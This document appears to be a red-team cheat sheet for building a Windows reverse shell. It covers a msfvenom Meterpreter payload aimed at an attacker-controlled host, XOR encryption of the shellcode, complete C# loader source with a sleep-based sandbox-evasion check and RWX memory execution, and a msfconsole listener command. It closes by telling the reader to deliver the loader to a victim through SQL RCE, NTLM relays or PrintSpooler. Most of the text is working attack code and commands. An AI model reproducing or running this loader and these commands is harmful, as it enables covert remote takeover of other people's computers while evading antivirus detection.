# BIN Shellcode XOR Encrypted Reverse Shell

### 1) Craft .bin payload

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=443 -f raw -o [PAYLOAD_NAME].bin

### 2) XOR Encrypt payload

    # python .\xorencrypt.py <payload_file> <output_file> <xor_key>
    python3 ./xorencrypt.py ./pay.bin pay_encrypted.bin a70f8922029506d2e37f375fd638cdf9e2c039c8a1e6e01189eeb4efb

### 3) Insert your encrypted shellcode in a new Project C# Console App, called gimmeshell

    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Text;
    using System.Threading.Tasks;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    
    namespace gimmeshell
    {
        class Program
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            [DllImport("kernel32.dll")]
            static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            [DllImport("kernel32.dll")]
            static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
            [DllImport("kernel32.dll")]
            static extern void Sleep(uint dwMilliseconds);
            private static byte[] xor(byte[] cipher, byte[] key)
            {
                byte[] xored = new byte[cipher.Length];
                for (int i = 0; i < cipher.Length; i++)
                {
                    xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
                }
                return xored;
            }
            static void Main(string[] args)
            {
                DateTime t1 = DateTime.Now;
                Sleep(4000);
                double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
                if (t2 < 1.5)
                {
                    return;
                }
                string key = "a70f8922029506d2e37f375fd638cdf9e2c039c8a1e6e01189eeb4efb";
                byte[] xorbuf = {
                    encryptedShellcode
                };
                byte[] buf = xor(xorbuf, Encoding.ASCII.GetBytes(key));
                int size = buf.Length;
                IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
                Marshal.Copy(buf, 0, addr, size);
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
        }
    }

### 4) Compile for Release and x64

    dotnet build

### 5) Start listener

    sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport 443; exploit"

### 6) Find a way to deliver o download this to the victim and then trigger it, just to mention examples, we could trigger execution using SQL RCE on Linked Servers, NTLM Relays, or PrintSpooler
